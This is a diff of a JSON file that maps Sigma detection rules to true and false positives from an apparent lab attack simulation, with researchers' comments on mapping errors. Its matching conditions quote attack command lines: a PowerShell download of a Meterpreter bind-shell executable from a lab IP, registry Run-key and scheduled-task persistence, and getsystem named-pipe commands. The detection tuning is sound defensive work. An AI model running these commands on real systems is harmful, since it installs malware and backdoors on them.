@@ -32,9 +32,7 @@
       "Command to change registry for autostart | SetAutostartAttack",
       "Command to run malware via schtask | ExecuteMalwareAttack"
     ],
-    "_false_hits": [
-      "None observed"
-    ],
+    "_false_hits": [],
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
@@ -79,9 +77,7 @@
     "_true_hits": [
       "Manipulating registry to enable autostart of malicious .exe | SetAutostartAttack"
     ],
-    "_false_hits": [
-      "None observed"
-    ],
+    "_false_hits": [],
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
@@ -93,9 +89,7 @@
 
   "DLL Load By System Process From Suspicious Locations": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/image_load/image_load_susp_dll_load_system_process.yml",
-    "_true_hits": [
-      "None observed"
-    ],
+    "_true_hits": [],
     "_false_hits": [
       "Desktop.ini created by setup process, executed on startup",
       "__PSScriptPolicyTest_*.*.ps1",
@@ -107,38 +101,360 @@
 
   "Encoded PowerShell Command Line Usage of ConvertTo-SecureString": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_powershell_cmdline_convertto_securestring.yml",
-    "_true_hits": [
-      "Hashdump or Mimikatz???"
-    ],
+    "_true_hits": [],
     "_false_hits": [
-      "None observed"
+      "init_tbf_client.py triggers this"
     ],
+    "conditions": {}
+  },
+
+
+  "Execution Of Non-Existing File": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_image_missing.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Seems very much like the SIGMA hits themselves are false positives, i.e. there is no file being called."
+    ],
+    "conditions": {}
+  },
+
+
+  "Execution of Suspicious File Type Extension": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_non_exe_image.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Seems very much like the SIGMA hits themselves are false positives, i.e. there is no file being called."
+    ],
+    "conditions": {}
+  },
+
+
+  "Meterpreter or Cobalt Strike Getsystem Service Installation": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/driver_load/driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml",
+    "_true_hits": [
+      "Usage of getsystem command by meterpreter | MimikatzAttack"
+    ],
+    "_false_hits": [],
     "conditions": {
       "entry1": [
-        "document.data.process.command_line",
-        "powershell \"$admin_secpwd = ConvertTo-SecureString 'breach' -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'BREACH\\Administrator', $admin_secpwd; Add-Computer -Credential $credential -DomainName 'BREACH' -Restart -Force\""
+        "document.data.winlog.event_data.ImagePath",
+        "cmd.exe /c echo * > \\\\.\\pipe\\*"
       ]
     }
   },
 
 
-  "sigma_rule_name": {
-    "_link": "link_to_rule_in_repo",
+  "Meterpreter or Cobalt Strike Getsystem Service Start": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_meterpreter_or_cobaltstrike_getsystem_service_start.yml",
     "_true_hits": [
-      "triggering_action_and_attack_name1",
-      "triggering_action_and_attack_name2"
+      "Usage of getsystem command by meterpreter | MimikatzAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "cmd.exe /c echo * > \\\\.\\pipe\\*"
+      ]
+    }
+  },
+
+
+  "Non Interactive PowerShell": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_non_interactive_powershell.yml",
+    "_true_hits": [
+      "Download command for meterpreter_bind_tcp.exe | DownloadMalwareAttack"
     ],
     "_false_hits": [
-      "possible_false_hits"
+      "init_tbf_client.py triggers this several times"
     ],
     "conditions": {
       "entry1": [
-        "document.data.relevant_key1",
-        "relevant_content1"
+        "document.data.process.command_line",
+        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+      ]
+    }
+  },
+
+
+  "NTLMv1 Logon Between Client and Server": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/builtin/system/win_lsasrv_ntlmv1.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Simple triggered by the usage of NTLMv1 in our network"
+    ],
+    "conditions": {}
+  },
+
+
+  "PowerShell DownloadFile": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_ps_downloadfile.yml",
+    "_true_hits": [
+      "Download command for meterpreter_bind_tcp.exe | DownloadMalwareAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
       ],
       "entry2": [
-        "document.data.relevant_key2",
-        "relevant_content2"
+        "document.data.process.command_line",
+        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+      ],
+      "entry3": [
+        "document.data.process.command_line",
+        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+      ],
+      "entry4": [
+        "document.data.process.command_line",
+        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+      ]
+    }
+  },
+
+
+  "PowerShell Scripts Run by a Services": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/driver_load/driver_load_powershell_script_installed_as_service.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "CLR usage logs",
+      "BitLocker",
+      "Creation of a ton of {some_hash}.tmp files???",
+      "Some SIGMA misses due to mapping errors???",
+      "mscorsvw.exe aka .NET framework optimization service"
+    ],
+    "conditions": {}
+  },
+
+
+  "PowerShell Web Download": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_powershell_download_cradles.yml",
+    "_true_hits": [
+      "Download command for meterpreter_bind_tcp.exe | DownloadMalwareAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
+      ],
+      "entry2": [
+        "document.data.process.command_line",
+        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+      ],
+      "entry3": [
+        "document.data.process.command_line",
+        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+      ],
+      "entry4": [
+        "document.data.process.command_line",
+        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+      ]
+    }
+  },
+
+
+  "Process Start From Suspicious Folder": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_run_folder.yml",
+    "_true_hits": [
+      "Bank-of-Nuthington.exe being started | Various Attacks???"
+    ],
+    "_false_hits": [
+      "DismHost.exe"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.name",
+        "Bank-of-Nuthington.exe"
+      ]
+    }
+  },
+
+
+  "Rare Service Installation": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/builtin/system/win_rare_service_installs.yml",
+    "_true_hits": [],
+    "_false_hits": [],
+    "conditions": {}
+  },
+
+
+  "Raw Disk Access Using Illegitimate Tools": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/raw_access_thread/sysmon_raw_disk_access_using_illegitimate_tools.yml",
+    "_true_hits": [
+      "Running meterpreter_bind_tcp.exe | ExecuteMalwareAttack",
+      "triggering_action_and_attack_name2"
+    ],
+    "_false_hits": [
+      "Literally thousands of false positives, most triggered by the userbehavior"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.name",
+        "meterpreter_bind_tcp.exe"
+      ],
+      "entry2": [
+        "document.data.process.name",
+        "Bank-of-Nuthington.exe"
+      ],
+      "entry3": [
+        "document.data.file.name",
+        "Bank-of-Nuthington.exe"
+      ],
+      "entry4": [
+        "document.data.destination.ip",
+        "172.18.0.3"
+      ]
+    }
+  },
+
+
+  "Redirect Output in CommandLine": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_cmd_redirect.yml",
+    "_true_hits": [
+      "Usage of getsystem command by meterpreter | MimikatzAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "cmd.exe /c echo drzzer > \\\\.\\pipe\\drzzer"
+      ]
+    }
+  },
+
+
+  "Reg Add RUN Key": {
+    "_link": "link_to_repo",
+    "_true_hits": [
+      "Adding registry key | SetAutostartAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "REG  ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+      ],
+      "entry2": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+      ]
+    }
+  },
+
+
+  "Rename Common File to DLL File": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_rename/file_rename_win_not_dll_to_dll.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Possibly caused by flawed mapping, OriginalFilename field is always missing"
+    ],
+    "conditions": {}
+  },
+
+
+  "Scheduled Task Creation": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_schtask_creation.yml",
+    "_true_hits": [
+      "Running meterpreter_bind_tcp.exe via scheduled task | ExecuteMalwareAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "schtasks  /create /sc once /st 23:59 /tn * /tr C:\\Windows\\meterpreter_bind_tcp.exe /ru BREACH\\client1"
+      ]
+    }
+  },
+
+
+  "Space After Filename - macOS": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/macos/process_creation/proc_creation_macos_space_after_filename.yml",
+    "_true_hits": [
+      "Technically triggers for most of our attack commands, but only due to the way info is stored. Unsure whether or not to include this"
+    ],
+    "_false_hits": [
+      "Same as true hits, just for benign processes",
+      "Designed for macOS, why does this even trigger"
+    ],
+    "conditions": {}
+  },
+
+
+  "Startup Folder File Write": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_event/file_event_win_startup_folder_file_write.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "desktop.ini aka Client setup"
+    ],
+    "conditions": {}
+  },
+
+
+  "Suspicious Driver Load from Temp": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/driver_load/driver_load_susp_temp_use.yml",
+    "_true_hits": [
+      "Bank-of-Nuthington.exe being started from Temp folder | EmailExeAttack"
+    ],
+    "_false_hits": [
+      "mscorsvw.exe",
+      "noscript.jar by userbehavior",
+      "High number of false positives might be caused by missing field ImageLoaded. Not sure though"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.file.name",
+        "Bank-of-Nuthington.exe"
+      ]
+    }
+  },
+
+
+  "Suspicious Network Command": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_network_command.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Initial network config using ipconfig /all"
+    ],
+    "conditions": {}
+  },
+
+
+  "Suspicious Remote Thread Source": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/create_remote_thread/sysmon_susp_remote_thread_source.yml",
+    "_true_hits": [
+      "Scheduled tasks spawning a new thread | ExecuteMalwareAttack"
+    ],
+    "_false_hits": [
+      "spoolssv.exe",
+      "noscript.jar",
+      "Again, mapping might by incorrect (SourceImage missing). Everything python does seems to trigger this alert"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.name",
+        "schtasks.exe"
+      ],
+      "entry2": [
+        "document.data.file.name",
+        "Bank-of-Nuthington.exe"
+      ]
+    }
+  },
+
+
+  "rule_name": {
+    "_link": "link_to_repo",
+    "_true_hits": [
+      "true_hits"
+    ],
+    "_false_hits": [
+      "false_hits"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.keywords",
+        "stuff"
       ]
     }
   }
